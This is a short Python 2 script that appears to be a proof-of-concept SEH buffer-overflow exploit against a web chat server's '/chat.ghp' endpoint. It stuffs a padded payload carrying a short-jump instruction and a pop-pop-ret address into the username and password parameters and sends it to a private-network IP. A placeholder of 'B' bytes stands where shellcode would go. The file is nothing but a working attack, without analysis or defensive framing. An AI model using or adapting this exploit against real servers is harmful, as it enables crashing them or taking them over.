#!/usr/bin/python

import string, sys
import socket, httplib

buffer = "A"*216
buffer += "\xEB\x06\x90\x90" #jump 6 bytes forward to our exploit code
buffer += "\xD9\xC6\xBA\x7C" #pop,pop,ret 
buffer += "B"*500

url = "/chat.ghp?username=" + buffer + "&password=" + buffer + "&room=1&sex=2"

print "Running...\r\n"
print url

conn = httplib.HTTPConnection("172.16.73.129",80)
conn.request("GET", url)
r1 = conn.getresponse()
print r1.status, r1.reason
conn.close()
